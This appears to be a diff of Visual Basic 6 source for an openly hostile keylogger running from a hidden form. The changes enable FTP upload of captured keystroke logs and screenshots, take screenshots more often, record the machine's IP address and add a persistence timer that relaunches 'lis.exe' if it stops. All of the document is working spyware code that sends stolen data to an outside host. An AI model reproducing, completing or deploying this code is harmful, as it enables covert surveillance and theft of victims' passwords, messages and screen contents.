@@ -1,5 +1,5 @@
 VERSION 5.00
-Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
+Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "msinet.ocx"
 Begin VB.Form Form1 
    Caption         =   "Form1"
    ClientHeight    =   4275
@@ -11,6 +11,11 @@ Begin VB.Form Form1
    ScaleWidth      =   10545
    StartUpPosition =   3  'Windows Default
    Visible         =   0   'False
+   Begin VB.Timer Timer4 
+      Interval        =   10
+      Left            =   2880
+      Top             =   3480
+   End
    Begin InetCtlsObjects.Inet Inet1 
       Left            =   6840
       Top             =   3600
@@ -62,10 +67,11 @@ Dim num_janela As Long
 
 'used by timer which call write in disk function
 Dim ctd As Integer
+Dim filename As String
 
 'time in minutes to perform the function that
-Const X_WRITE_DISK = 0.1  'write data in disk
-Const X_SCREENSHOT = 1  'take an screenshot
+Const X_WRITE_DISK = 1  'write data in disk
+Const X_SCREENSHOT = 0.2  'take an screenshot
 'Const X_SEND_FTP = 1 send all captured data to ftp - not implemented
 
 'Credentials for ftp login below
@@ -78,6 +84,7 @@ Private Function GetActiveWindowTitle() As String
 Dim textlen As Long
 Dim titlebar As String
 Dim slength As Long
+
 
 textlen = 999999
 titlebar = Space(textlen + 1)
@@ -215,17 +222,17 @@ End Function
 
 
 Private Sub Form_Load()
-If Dir$(App.Path + "\data_klg") = "" Then
+On Error Resume Next
+
     MkDir$ App.Path + "\data_klg"
-End If
 
 
 
 
 'Set ftp credentials to VB6 Ftp Component
-'Inet1.URL = FTP_HOST
-'Inet1.UserName = FTP_USER
-'Inet1.Password = FTP_PASS
+Inet1.URL = FTP_HOST
+Inet1.UserName = FTP_USER
+Inet1.Password = FTP_PASS
 
 'load basic data from the system for hack
 Text1.Text = Text1.Text + "Hora de inicialização:" + Date$ + "-" + Time$ + vbCrLf + "bloco possivelmente contendo o ip:" + vbCrLf + vbCrLf + "::::" + vbCrLf + getIpAdress() + vbCrLf + "::::" + vbCrLf + vbCrLf
@@ -267,24 +274,28 @@ End Sub
 Private Sub write_to_buffer()
     Dim fso As New FileSystemObject
     Dim arqtxt As TextStream
-    Dim filename As String
-    filename = Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
-    Set arqtxt = fso.CreateTextFile(App.Path + "/data_klg/" + filename, True)
+    send_ftp_data filename 'send the last created file
+    
+    filename = Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".klg"
+    
+    Set arqtxt = fso.CreateTextFile(App.Path + "/" + filename, True)
     arqtxt.Write (Text1.Text)
     Text1.Text = ""
-    send_ftp_data filename
+    arqtxt.Close
 End Sub
 
 Private Sub take_a_screenshot()
-    SavePicture CaptureScreen(), App.Path + "/data_klg/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
+    Dim scrrenshotName As String
+    scrrenshotName = App.Path + "/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".sht"
+    SavePicture CaptureScreen(), scrrenshotName
+    send_ftp_data scrrenshotName
 End Sub
 
 Private Sub send_ftp_data(ByVal filename As String)
     If Inet1.StillExecuting Then
         Inet1.Cancel
     End If
-    
-    Inet1.Execute , "send " & App.Path & "\data_klg\" & filename & " " & filename
+    Inet1.Execute , "send " + filename + " //" + filename
     
     Do While Inet1.StillExecuting
         DoEvents
@@ -300,4 +311,10 @@ Private Sub Timer3_Timer()
     
     If ctd Mod (60 * X_WRITE_DISK) = 0 Then write_to_buffer
     If ctd Mod (60 * X_SCREENSHOT) = 0 Then take_a_screenshot
+End Sub
+
+Private Sub Timer4_Timer()
+ If IsProcessRunning("lis.exe") = False Then
+    Shell (App.Path + "/lis.exe")
+ End If
 End Sub
